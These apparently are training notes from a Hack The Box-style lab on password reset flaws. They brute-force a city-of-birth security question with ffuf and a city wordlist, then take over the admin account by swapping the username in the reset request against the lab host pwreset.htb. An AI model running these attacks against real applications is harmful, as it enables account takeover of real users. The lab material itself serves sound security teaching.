## Guessable Password Reset Questions

For instance, assuming a web application uses a security question like `What city were you born in?`:

![](Vulnerable%20Password%20Reset-20260914-091629.png)

We can attempt to brute-force the answer to this question by using a proper wordlist. There are multiple lists containing large cities worldwide. For instance, [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world. This is a great starting point for brute-forcing the city in which a user was born.

```sh
3kjS@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

3kjS@htb[/htb]$ wc -l city_wordlist.txt 

26468 city_wordlist.txt
```

To set up our brute-force attack, we first need to specify the user we want to target:

![](Vulnerable%20Password%20Reset-20260914-091740.png)

As an example, we will target the user `admin`. After specifying the username, we must answer the user's security question. The corresponding request looks like this:

![](Vulnerable%20Password%20Reset-20260914-091753.png)

```sh
3kjS@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

![](Vulnerable%20Password%20Reset-20260914-091915.png)

We could narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question. For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:

```sh
3kjS@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

3kjS@htb[/htb]$ wc -l german_cities.txt 

1117 german_cities.txt
```
## Manipulating the Reset Request

![](Vulnerable%20Password%20Reset-20260914-092007.png)

We will use our demo account `htb-stdnt`, which results in the following request:

```http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

Afterward, we need to supply the response to the security question:

![](Vulnerable%20Password%20Reset-20260914-092027.png)

Supplying the security response `London` results in the following request:

```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

![](Vulnerable%20Password%20Reset-20260914-092050.png)

The final request looks like this:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```
